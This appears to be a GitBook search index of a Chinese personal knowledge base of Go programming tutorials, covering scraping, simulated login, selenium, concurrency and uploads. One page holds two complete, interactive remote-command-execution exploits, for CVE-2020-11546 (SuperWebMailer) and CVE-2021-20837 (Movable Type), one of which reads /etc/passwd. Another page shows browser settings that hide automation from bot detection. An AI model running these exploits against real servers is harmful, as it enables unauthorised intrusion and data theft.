} cookieJar和代理设置 // 初始化Client jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) proxy,_ := url.Parse(\"socks5://127.0.0.1:1080\") netTransport := &http.Transport{ Proxy: http.ProxyURL(proxy), MaxIdleConnsPerHost: 10, ResponseHeaderTimeout: time.Second * time.Duration(5), } Client = http.Client{ Transport: netTransport, Jar: jar, Timeout: time.Second * 10, } Client.Get(\"http://cip.cc\") gzip解压 有些返回的数据是二进制乱码的，这个时候我们就需要进行gzip解压 resp, _ := Client.Do(req) reader,_ := gzip.NewReader(resp.Body) source, _ := ioutil.ReadAll(reader) fmt.Println(string(source)) go flag 这个库主要用来判断工具命令行传入的参数用的 虽然go有os.Args，但是不如这个好用 演示： func main() { var filePath string flag.StringVar(&filePath, \"file\", \"\", \"markdown文件路径\") flag.Parse() if flag.Lookup(\"file\").DefValue == flag.Lookup(\"file\").Value.String() { // 避免使用默认参数，所以加个判断 flag.Usage() } if flag.NFlag() == 0 { // 使用的命令行参数个数，这个地方可以用来判断用户是否输入参数（程序正常情况下会使用默认参数） flag.Usage() os.Exit(0) } } [!NOTE] 还有一些其他的参数，可以自己研究下，基本上看到名字就知道啥意思，主要用的就上面那些 如果觉得帮助不好看，可以重写flag.Usage()这个方法 flag.Usage = func() { fmt.Fprintf(flag.CommandLine.Output(), \"markdown图片自动上传到图床\\nUsage of %s:\\n\", os.Args[0]) flag.PrintDefaults() } 颜色输出 最简单的版本 package main import \"fmt\" func main() { fmt.Printf(\"\\033[1;31;40m%s\\033[0m\\n\",\"Red.\") fmt.Printf(\"\\033[1;37;41m%s\\033[0m\\n\",\"Red.\") } 输出所有颜色 package main import \"fmt\" func main() { for b := 40; b 但是每一次都这样很难记住，所以已经有人给他封装成了一个包：https://github.com/fatih/color，可以快速看下它的说明文档 实例： package main import ( \"github.com/fatih/color\" ) func main() { color.Blue(\"aaaa%scccc\", \"bbb\") color.Red(\"red red\") color.Magenta(\"And many others ..\") } 参考 Golang标准库文档 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 17:44:27 "},"知识库/04.编程开发/01.GO/02.GO实例/02.使用GO编写POC.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/02.使用GO编写POC.html","title":"02.使用GO编写POC","keywords":"","body":"CVE-2020-11546 [!NOTE] 已上传至GitHub:https://github.com/damit5/CVE-2020-11546 扩展1：交叉编译 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_darwin CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_linux CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_win.exe 扩展2：go.mod go mod init go mod init github.com/damit5/CVE-2020-11546 不然不能go get -u自动下载编译，会出现问题 扩展3：go get 直接使用go get -u github.com/xxx可能出现版本的问题，可以使用如下命令执行版本或者分支 go get -u -v github.com/damit5/CVE-2020-11546@master [!TIP] 也可以使用@commit hash等等 http://icattlecoder.github.io/2019/03/29/go-module-and-version.html https://zhuanlan.zhihu.com/p/103534192 扩展4：交互输入 for { fmt.Printf(\"\\n\\ncommand: \") _, _ = fmt.Scanln(&command) if command != \"\" { break } } 代码 package main import ( \"bytes\" \"fmt\" \"io/ioutil\" \"net/http\" \"os\" \"strings\" ) func banner(){ fmt.Println(` .___ _____ ____ __ __| _// | | _____/_ |/ |_ ______ / __ |/ | |_/ \\| \\ __\\/ ___/ / /_/ / ^ / Y Y \\ || | \\___ \\ \\____ \\____ ||__|_| /___||__| /____ > \\/ |__| \\/ \\/ CVE-2020-11546 `) } /* * 参数检查 */ func argsCheck(args []string) { if len(args) != 2 { fmt.Printf(\"Usage:\\n\\t./%s \\n\", args[0]) os.Exit(0) } } /* * url处理 */ func urlHandler(target string) string { // 没有http前缀的添加http前缀 if !strings.HasPrefix(target, \"http\") { target = \"http://\" + target } // 有/结尾的就去掉/ if strings.HasSuffix(target, \"/\") { // 去掉后缀 / target = strings.TrimSuffix(target, \"/\") fmt.Println(target) } return target } /* * 漏洞检查 */ func check(target string) bool { // 创建请求 vulurl := target + \"/mailingupgrade.php\" req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(`step=4&Language=de%7b$%7bsystem(%22echo vultest%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E`))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"application/x-www-form-urlencoded\") // 发起请求 client := http.Client{} resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(body), \"vultest\") { return true } return false } /* * 漏洞检查 */ func exp(target string, command string) { // 创建请求 vulurl := target + \"/mailingupgrade.php\" data := `step=4&Language=de%7b$%7bsystem(%22` + command + `%22)%7d%7d&RegName=12345678901234567890123&RegNumber=12345&NextBtn=Weiter+%3E` req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(data))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"application/x-www-form-urlencoded\") // 发起请求 client := http.Client{} resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) res := strings.Replace(string(body), \"Can't load correct language file in /language directory\", \"\", -1) res = strings.TrimSpace(res) fmt.Println(res) } func main() { args := os.Args banner() argsCheck(args) target := args[1] target = urlHandler(target) if check(target) { fmt.Printf(\"target %s is vuln\", target) var command string for { for { fmt.Printf(\"\\n\\ncommand: \") fmt.Scanln(&command) if command != \"\" { break } } exp(target, command) } } else { fmt.Printf(\"target %s is not vuln\", target) } } 测试图 CVE-2021-20837 扩展5：忽略SSL证书 [!WARNING] 这个错误不容易发现，所以需要经验来判断，在初始化客户端的时候需要忽略SSL证书 var Client http.Client tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client = http.Client{ Transport: tr, } 扩展6：正则表达式 默认情况下，.是不能匹配换行符\\n的，有时候我们有需要通过.匹配到\\n，这个时候就需要稍微修改一下.了 [!TIP] 在线正则表达式测试网站：https://regex101.com/ (?s).* 实例： 代码 package main import ( \"bytes\" \"crypto/tls\" \"encoding/base64\" \"fmt\" \"io/ioutil\" \"net/http\" \"os\" \"regexp\" \"strings\" ) // 客户端全局变量 var Client http.Client func banner(){ fmt.Println(` .___ _____ ____ __ __| _// | | _____/_ |/ |_ ______ / __ |/ | |_/ \\| \\ __\\/ ___/ / /_/ / ^ / Y Y \\ || | \\___ \\ \\____ \\____ ||__|_| /___||__| /____ > \\/ |__| \\/ \\/ CVE-2021-20837 `) } /* * 参数检查 */ func argsCheck(args []string) { if len(args) != 2 { fmt.Printf(\"Usage:\\n\\t./%s \\n\", args[0]) os.Exit(0) } } /* * url处理 */ func urlHandler(target string) string { // 没有http前缀的添加http前缀 if !strings.HasPrefix(target, \"http\") { target = \"http://\" + target } // 有/结尾的就去掉/ if strings.HasSuffix(target, \"/\") { // 去掉后缀 / target = strings.TrimSuffix(target, \"/\") fmt.Println(target) } return target } /* * 漏洞检查 */ func check(target string) bool { // 创建请求 vulurl := target + \"/cgi-bin/mt/mt-xmlrpc.cgi\" command := \"`cat /etc/passwd`\" base64_cmd := base64.StdEncoding.EncodeToString([]byte(command)) payload := fmt.Sprintf(` mt.handler_to_coderef %s `, base64_cmd) req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(payload))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"text/xml; charset=UTF-8\") // 发起请求 tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client = http.Client{ Transport: tr, } resp, _ := Client.Do(req) body, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(body), \"root:x:0\") { return true } return false } /* * 漏洞检查 */ func exp(target string, command string) { // 创建请求 vulurl := target + \"/cgi-bin/mt/mt-xmlrpc.cgi\" base64_cmd := base64.StdEncoding.EncodeToString([]byte(\"`\" + command + \"`\")) payload := fmt.Sprintf(` mt.handler_to_coderef %s `, base64_cmd) req, _ := http.NewRequest(\"POST\", vulurl, bytes.NewReader([]byte(payload))) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\") req.Header.Set(\"Content-type\", \"text/xml; charset=UTF-8\") // 发起请求 resp, _ := Client.Do(req) body, _ := ioutil.ReadAll(resp.Body) // 正则表达式匹配结果 regex, _ := regexp.Compile(\"Can't\\\\slocate\\\\s((?s).*)\\\\sin @INC\") res := regex.FindAllStringSubmatch(string(body), 1)[0][1] fmt.Println(res) } func main() { args := os.Args banner() argsCheck(args) target := args[1] target = urlHandler(target) if check(target) { fmt.Printf(\"target %s is vuln\", target) var command string for { for { fmt.Printf(\"\\n\\ncommand: \") _, _ = fmt.Scanln(&command) if command != \"\" { break } } exp(target, command) } } else { fmt.Printf(\"target %s is not vuln\", target) } } 测试图 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 17:44:50 "},"知识库/04.编程开发/01.GO/02.GO实例/03.使用GO模拟登陆.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/03.使用GO模拟登陆.html","title":"03.使用GO模拟登陆","keywords":"","body":"前期准备 本次为了方便解析html，快速提取登陆时需要的一些数据，类似python中的bs4，而不是采用正则表达式去匹配数据，所以会用到一个新的库 goquery：https://github.com/PuerkitoBio/goquery 安装： go get -v github.com/PuerkitoBio/goquery goquery基础用法 [!NOTE] 大部分内容匹配规则和jquery类似 以 https://cloud.ctfd.io/login 页面为例 创建document实例 req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/login\", nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") client := &http.Client{} resp, _ := client.Do(req) // 参数类型为 io.Reader dom, _ := goquery.NewDocumentFromReader(resp.Body) 标签选择器 这个比较简单，就是基于a,p等这些HTML的基本元素进行选择，这种直接使用Element名称作为选择器即可。比如dom.Find(\"div\") 实例：找到所有的a标签，并循环获取值（不是属性，是标签中的值） dom.Find(\"a\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) }) Features Pricing Store Contact Login Sign Up Don't have an account? Sign Up # 和截图匹配的这一条 Forgot password? Exiting. ID选择器 通过ID定位到元素，算是最常用的之一 实例：比如我们要定位到id=\"navbarResponsive\"的元素，输出它的源码，不过需要注意的是，输出源码并不会输出当前的标签 selection := dom.Find(\"#navbarResponsive\") // selection := dom.Find(\"div#navbarResponsive\") // 同时匹配标签和id，更准确 fmt.Println(selection.Html()) Features Pricing Store Contact Login Sign Up class选择器 它的用法和ID选择器类似，为Find(\".class\") 实例：寻找所有class=\"nav-link元素，并输出他们的值 dom.Find(\".nav-link\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) }) [!TIP] 也可以组合，如 a.nav-link：寻找所有a标签且class为nav-link的元素 Features Pricing Store Contact Login Sign Up 属性选择器 上面3种有时候还不够用，这个时候就需要属性选择器来帮忙了 实例：获取input标签中属性name为nonce的元素的value值 [!Note] 就是获取红框中的值，这里放图了下面就不放了 res, exist := dom.Find(\"input[name=nonce]\").Attr(\"value\") if exist { fmt.Println(res) // YidceDA0XHhhZVx4YmE9XHgxNFx4MTVceDhlXHgxNC9ceGUyJw== } 补充： 除了完全相等，还有其他匹配方式，使用方式类似，这里统一列举下，不再举例 选择器 说明 Find(\"div[lang]\") 筛选含有lang属性的div元素 Find(\"div[lang=zh]\") 筛选lang属性为zh的div元素 Find(\"div[lang!=zh]\") 筛选lang属性不等于zh的div元素 Find(\"div[lang¦=zh]\") 筛选lang属性为zh或者zh-开头的div元素 Find(\"div[lang*=zh]\") 筛选lang属性包含zh这个字符串的div元素 Find(\"div[lang~=zh]\") 筛选lang属性包含zh这个单词的div元素，单词以空格分开的 Find(\"div[lang$=zh]\") 筛选lang属性以zh结尾的div元素，区分大小写 Find(\"div[lang^=zh]\") 筛选lang属性以zh开头的div元素，区分大小写 以上是属性筛选器的用法，都是以一个属性筛选器为例，当然你也可以使用多个属性筛选器组合使用，比如： Find(\"div[id][lang=zh]\"),用多个中括号连起来即可。当有多个属性筛选器的时候，要同时满足这些筛选器的元素才能被筛选出来 内容提取 获取到了标签，当然就像获取到里面的值了 parent>child子选择器 [!NOTE] 上面的基本都够用了，这里再列举一些可能会用到的筛选器 如果我们想筛选出某个元素下符合条件的子元素，我们就可以使用子元素筛选器，它的语法为Find(\"parent>child\"),表示筛选parent这个父元素下，符合child这个条件的最直接（一级）的子元素。 实例：form标签下的input标签的属性value的值 res, exist := dom.Find(\"form>input\").Attr(\"value\") if exist { fmt.Println(res) // YiJceGU0YTxceGY3alx4MGYnVVx4ZDdceGNlIg== } prev+next相邻选择器 假设我们要筛选的元素没有规律，但是该元素的上一个元素有规律，我们就可以使用这种下一个相邻选择器来进行选择。 实例：h2标签旁边的p标签的值 [!TIP] 如果class的值存在空格，那么可以用属性的格式来匹配，防止空格影响结果 dom.Find(\"h2[class='block-title text-center']+p.text-center\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) // Don't have an account? Sign Up }) prev~next兄弟选择器 有相邻就有兄弟，兄弟选择器就不一定要求相邻了，只要他们共有一个父元素就可以。 实例：获取lable标签的兄弟标签input dom.Find(\"label~input\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Attr(\"name\")) // email true }) 内容过滤器 有时候我们使用选择器选择出来后，希望再过滤一下，这时候就用到过滤器了 实例：获取包含内容Email的label标签 dom.Find(\"label:contains(Email)\").Each(func(i int, selection *goquery.Selection) { fmt.Println(selection.Text()) // Email Address }) 扩展： Find(\":contains(text)\")表示筛选出的元素要包含指定的文本 Find(\":empty\")表示筛选出的元素都不能有子元素（包括文本元素），只筛选那些不包含任何子元素的元素 Find(\":has(selector)\")和contains差不多，只不过这个是包含的是元素节点:first-of-type过滤器 :first-child选择器限制的比较死，必须得是第一个子元素，如果该元素前有其他在前面，就不能用:first-child了，这时候:first-of-type就派上用场了，它要求只要是这个类型的第一个就可以 实例：输出第一个div标签的源码ret, _ := dom.Find(\"div:first-of-type\").Html() fmt.Println(ret) 扩展： :last-child 和 :last-of-type过滤器正好和上面的2歌过滤器相反，表示最后一个过滤器:nth-child(n) 过滤器系列 表示筛选出的元素是其父元素的第n个元素，n以1开始。所以我们可以知道:first-child和:nth-child(1)是相等的。通过指定n，我们就很灵活的筛选出我们需要的元素 同样，:nth-of-type(n)和 :nth-child(n) 类似，只不过它表示的是同类型元素的第n个,所以:nth-of-type(1) 和 :first-of-type是相等的 nth-last-child(n) 和:nth-last-of-type(n) 过滤器是倒序开始计算的，最后一个元素被当成了第一个 [!WARNING] 都不举例了，没必要 :only-child 过滤器系列 Find(\":only-child\") 过滤器，从字面上看，可以猜测出来，它表示筛选的元素，在其父元素中，只有它自己，它的父元素没有其他子元素，才会被匹配筛选出来。 :only-of-type 过滤器和其他的类似，同类型元素只要只有一个，就可以被筛选出来 选择器或(|)运算 如果我们想同时筛选出div,span等元素怎么办？这时候可以采用多个选择器进行组合使用，并且以逗号(,)分割，Find(\"selector1, selector2, selectorN\")表示，只要满足其中一个选择器就可以被筛选出来，也就是选择器的或(|)运算操作。 实例：筛选出所有的meta标签和input标签，并且获取到其属性name的值 dom.Find(\"meta,input\").Each(func(i int, selection *goquery.Selection) { val, exists := selection.Attr(\"name\") if exists { fmt.Println(val) } }) viewport description author twitter:card twitter:site twitter:creator twitter:title twitter:description twitter:image email password nonce 补充说明 1、类似函数的位置操作 方法 说明 Find(selection) *Selection 根据选择器查找节点集 Eq(index int) *Selection 根据索引获取某个节点集 First() *Selection 获取第一个子节点集 Last() *Selection 获取最后一个子节点集 Next() *Selection 获取下一个兄弟节点集 NextAll() *Selection 获取后面所有兄弟节点集 Prev() *Selection 前一个兄弟节点集 Get(index int) *html.Node 根据索引获取一个节点 Index() int 返回选择对象中第一个元素的位置 Slice(start, end int) *Selection 根据起始位置获取子节点集 2、循环遍历选择的节点 方法 说明 Each(f func(int, *Selection)) *Selection 遍历 EachWithBreak(f func(int, *Selection) bool) *Selection 可中断遍历 Map(f func(int, *Selection) string) (result []string) 返回字符串数组 3、检测或获取节点属性值 方法 说明 Attr(), RemoveAttr(), SetAttr() 获取，移除，设置属性的值 AddClass(), HasClass(), RemoveClass(), ToggleClass() 类相关 Html() 获取该节点的html Length() 返回该Selection的元素个数 Text() 获取该节点的文本值 4、 在文档树之间来回跳转（常用的查找节点方法） 方法 说明 Children() 返回selection中各个节点下的孩子节点 Contents() 获取当前节点下的所有节点 Find() 查找获取当前匹配的元素 Next() 下一个元素 Prev() 上一个元素 Cookie自动保存更新 [!NOTE] 大家都知道，网站登陆后肯定有个用来鉴权的东西，而Cookie和token居多，这里我们讲一下用Cookie [!DANGER] 网上直接搜go模拟登陆，但是出来的代码都是登陆后手动设置req的cookie，而不会自动的更新cookie，既然python里面都有request.Session，那golang里面肯定也有类似的东西吧！ 结合之前的经验，发现在创建客户端的时候，会传入一个CookieJar，这玩意儿根据经验肯定是用来存放Cookie的 试一下便知 根据经验，第一次访问百度的时候，百度会给咱们分配cookie，那咱们就可以用它来试试能不能自动保存更新Cookie 然后根据它的参数构造一个CookieJar出来 jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) 再创建个http客户端给它放进去，发起请求，查看结果 package main import ( \"fmt\" \"golang.org/x/net/publicsuffix\" \"net/http\" \"net/http/cookiejar\" ) func main() { // 创建客户端 jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client := http.Client{Jar: jar} fmt.Printf(\"访问前：\\n\") fmt.Println(client.Jar) client.Get(\"https://www.baidu.com\") fmt.Printf(\"\\n\\n访问后：\\n\") fmt.Println(client.Jar) } 可以看到我们的Cookie成功自动保存了，那就说明之前的猜想是对的 后面对百度发起访问，就会自动带上Cookie了 实战 实战模拟登陆CTFD平台：https://cloud.ctfd.io/login 主要分为3步： 获取nonce 登陆 验证登陆是否成功 完整代码： package main import ( \"fmt\" \"github.com/PuerkitoBio/goquery\" \"golang.org/x/net/publicsuffix\" \"io/ioutil\" \"net/http\" \"net/http/cookiejar\" \"net/url\" \"strings\" ) // 登陆账号密码 var Config = map[string]string{ \"email\": \"yeciyar420@zherben.com\", \"passwd\": \"xxxxx\", } // 登陆客户端 var Client http.Client /* * 1. 获取登陆需要的Nonce，同时初始化客户端 */ func getNonce() string { req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/login\", nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") // 初始化client jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) Client = http.Client{Jar: jar} resp, _ := Client.Do(req) dom, _ := goquery.NewDocumentFromReader(resp.Body) val, _ := dom.Find(\"input[name=nonce]\").Attr(\"value\") return val } /* * 2. 登陆 */ func login(nonce string) (bool) { // 构造请求 param := url.Values{} param.Set(\"email\", Config[\"email\"]) param.Set(\"password\", Config[\"passwd\"]) param.Set(\"nonce\", nonce) data := param.Encode() req, _ := http.NewRequest(\"POST\", \"https://cloud.ctfd.io/login\", strings.NewReader(data)) req.Header.Set(\"authority\", \"cloud.ctfd.io\") req.Header.Set(\"content-type\", \"application/x-www-form-urlencoded\") req.Header.Set(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") req.Header.Set(\"referer\", \"https://cloud.ctfd.io/admin\") // 发起请求 resp, _ := Client.Do(req) source, _ := ioutil.ReadAll(resp.Body) if strings.Contains(string(source), \"Your password is wrong\"){ fmt.Println(\"账号或密码错误\") return false } else { return true } } /* * 3. 验证是否登陆成功 */ func getInfo() { req, _ := http.NewRequest(\"GET\", \"https://cloud.ctfd.io/profile\", nil) req.Header.Set(\"authority\", \"cloud.ctfd.io\") req.Header.Set(\"content-type\", \"application/x-www-form-urlencoded\") req.Header.Set(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\") req.Header.Set(\"referer\", \"https://cloud.ctfd.io/admin\") resp, _ := Client.Do(req) if resp.StatusCode == 200 { dom, _ := goquery.NewDocumentFromReader(resp.Body) val, exists := dom.Find(\"#name-input\").Attr(\"value\") if exists { fmt.Printf(\"Success, Login as %s\\n\", val) } } } func main() { nonce := getNonce() fmt.Println(\"Nonce: \", nonce) res := login(nonce) if res { fmt.Println(\"登陆成功，尝试获取个人信息...\") getInfo() } } 效果： Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 17:45:24 "},"知识库/04.编程开发/01.GO/02.GO实例/04.使用GO+selenium.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/04.使用GO+selenium.html","title":"04.使用GO+selenium","keywords":"","body":"前言 有的网站存在反爬机制，有的网站存在复杂的前端加密等等情况 这个时候就可以用selenium来模拟用户操作，简化我们的分析绕过时间 推荐：https://github.com/tebeka/selenium 安装 安装这个依赖包 go get -t -d github.com/tebeka/selenium 下载依赖 # 找到刚才下载的源码的路径 # 我的在 $GOPATH/pkg/mod/github.com/tebeka/selenium@v0.9.9/ cd vendor go run init.go --alsologtostderr --download_browsers --download_latest [!WARNING|style:flat] 下载依赖可能会遇到问题，没问题最好 手动安装：对应不同类型的浏览器进行安装 WebDriver，Google Chrome 需要安装 ChromeDriver，Firefox 则需要安装 geckodriver 安装的driver版本一定要和浏览器版本一致 基础使用 [!NOTE] 示例：https://github.com/tebeka/selenium/blob/master/example_test.go 文档：https://pkg.go.dev/github.com/tebeka/selenium#readme-documentation 实例：打开baidu.com然后搜索123123 数据那一块和python操作Selenium的方法都差不多 package main import ( \"fmt\" \"github.com/tebeka/selenium\" \"io/ioutil\" \"os\" ) const ( chromeDriverPath = \"/usr/local/bin/chromedriver\" port = 12345 ) func main() { // 创建driver服务实例 options := []selenium.ServiceOption{ //selenium.GeckoDriver(geckoDriverPath), // Specify the path to GeckoDriver in order to use Firefox. selenium.Output(os.Stderr), } selenium.SetDebug(true) service, err := selenium.NewChromeDriverService(chromeDriverPath, port, options...) if err != nil { panic(err) } defer service.Stop() // 连接到本地运行的WebDriver实例。 caps := selenium.Capabilities{ \"browserName\": \"chrome\", } wd, err := selenium.NewRemote(caps, fmt.Sprintf(\"http://localhost:%d/wd/hub\", port)) if err != nil { panic(err) } defer wd.Quit() // 发起请求 _ = wd.Get(\"http://www.baidu.com/\") // 截屏 img, _ := wd.Screenshot() _ = ioutil.WriteFile(\"a.png\", img, 0666) element, _ := wd.FindElement(selenium.ByID, \"kw\") _ = element.Clear() // 方法一 _ = element.SendKeys(\"123123\") // 方法二 //_ = element.SendKeys(` // package main // import fmt // func main(){ // fmt.Println(\"hello\") // } // `) button, _ := wd.FindElement(selenium.ByID, \"su\") _ = button.Click() source, _ := wd.PageSource() fmt.Println(source) // 避免直接关闭chromnium页面，构造一个输入 var name string fmt.Scanln(&name) } 反爬 使用firefox https://gist.github.com/jacoduplessis/322d695d4cdab6ce866b939964588642 配置Chrome Chrome启动参数大全/* 利用Selenium去获取网页的源码，有的有反爬机制，返回源码 */ func seleniumGetSource(url string) string { // 连接到本地运行的WebDriver实例。 caps := selenium.Capabilities{ \"browserName\": \"Google Chrome\", } //禁止图片加载，加快渲染速度 imagCaps := map[string]interface{}{ \"profile.managed_default_content_settings.images\": 2, } // chrome设置 chromeCaps := chrome.Capabilities{ Prefs: imagCaps, Path: \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\", Args: []string{ //静默执行请求 //\"--headless\", // 设置Chrome无头模式，在linux下运行，需要设置这个参数，否则会报错 \"--no-sandbox\", \"--user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.11\", // 模拟user-agent，防反爬, \"--disable-blink-features=AutomationControlled\", // 从 Chrome 88 开始，它的 V8 引擎升级了，加了这个参数，window.navigator.webdriver=false \"--proxy-server=socks5://127.0.0.1:1080\", }, ExcludeSwitches: []string{ \"enable-automation\", // 禁用左上角的控制显示 }, } caps.AddChrome(chromeCaps) wd, err := selenium.NewRemote(caps, fmt.Sprintf(\"http://localhost:%d/wd/hub\", port)) if err != nil { panic(err) } defer wd.Quit() // 发起请求 _ = wd.Get(url) time.Sleep(time.Second*5) source, _ := wd.PageSource() //res, _ := wd.ExecuteScriptRaw(\"console.log(\\\"123123\\\" + window.navigator.webdriver)\", nil) //fmt.Println(string(res)) var x string _, _ = fmt.Scanln(&x) return source } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:57 "},"知识库/04.编程开发/01.GO/02.GO实例/05.限制GO并发数.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/05.限制GO并发数.html","title":"05.限制GO并发数","keywords":"","body":"前言 开发过程中，如果不限制并发数，如下代码这种，可能直接造成服务器宕机，而且很多结果不会输出 [!TIP|style:flat] 很多结果不会输出，是因为主协程结束时，子协程也会终止掉。 func main() { userCount := math.MaxInt64 for i := 0; i 尝试chan package main import ( \"fmt\" \"math\" \"time\" ) func out(i int, semaphore chan bool){ fmt.Printf(\"go func: %d\\n\", i) // 释放通道 确实可以2个协程并发，但是和上面结果一样，很多结果不会输出，是因为主协程结束时，子协程也会终止掉。 go func: 1 go func: 0 go func: 3 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 尝试sync 主要使用sync.WaitGroup{} package main import ( \"fmt\" \"math\" \"sync\" \"time\" ) var wg = sync.WaitGroup{} func out(i int){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) wg.Done() } func main() { userCount := math.MaxInt8 for i := 0; i 所有结果都显示出来了，也就是说所有子协程都执行完了，但是没有控制并发数量 尝试chan+sync√ 从上面2个可以看出，一个可以控制并发数量，另一个可以让所有子协程都执行完，所以结合一下，就能达到我们的目的了 package main import ( \"fmt\" \"math\" \"sync\" \"time\" ) var wg = sync.WaitGroup{} func out(i int, semaphone chan bool){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) // 释放通道 结合一下，确实能达到我们想到的效果了！！！就是结果有点乱，一般来说不影响了 go func: 1 go func: 0 go func: 3 go func: 2 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 go func: 9 信号量Semaphore 和Python中的信号量一样，感觉是结合了chan+sync，确实是一个很好的方案，输出的结果也是按顺序输出的 https://github.com/EDDYCJY/gsema package main import ( \"fmt\" \"github.com/EDDYCJY/gsema\" \"math\" \"time\" ) var semaphore = gsema.NewSemaphore(2) func out(i int){ fmt.Printf(\"go func: %d\\n\", i) time.Sleep(time.Second) defer semaphore.Done() } func main() { userCount := math.MaxInt8 for i := 0; i go func: 0 go func: 1 go func: 2 go func: 3 go func: 4 go func: 5 go func: 6 go func: 7 go func: 8 go func: 9 协程池 这个就是一次性创建所有的协程，然后再根据大小来调用 https://github.com/panjf2000/ants https://github.com/Jeffail/tunny 参考 来，控制一下 Goroutine 的并发数量 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-06 13:11:19 "},"知识库/04.编程开发/01.GO/02.GO实例/06.使用GO上传图片.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/06.使用GO上传图片.html","title":"06.使用GO上传图片","keywords":"","body":"前言 需要批量上传图片到图床，之前用python写脚本倒是很简单，不过GO因为并发太强大了，所以这次用GO来试试 基础版 构建一个上传图片的请求，主要代码在imgkr()函数中 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"os\" \"path/filepath\" ) var client http.Client func imgkr() { // 要上传的文件 imgFilePath := \"/Users/d4m1ts/d4m1ts/Upload/logo.png\" file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 part, _ := bodyWriter.CreateFormFile(\"source\", filepath.Base(file.Name())) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"a\", \"b\") // 自动补充boundary结尾 bodyWriter.Close() fmt.Println(bodyBuff) //构建的完整数据包，没有header // 组合创建数据包 req, _ := http.NewRequest(\"POST\", \"http://127.0.0.1:8000\", bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") client.Do(req) } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: 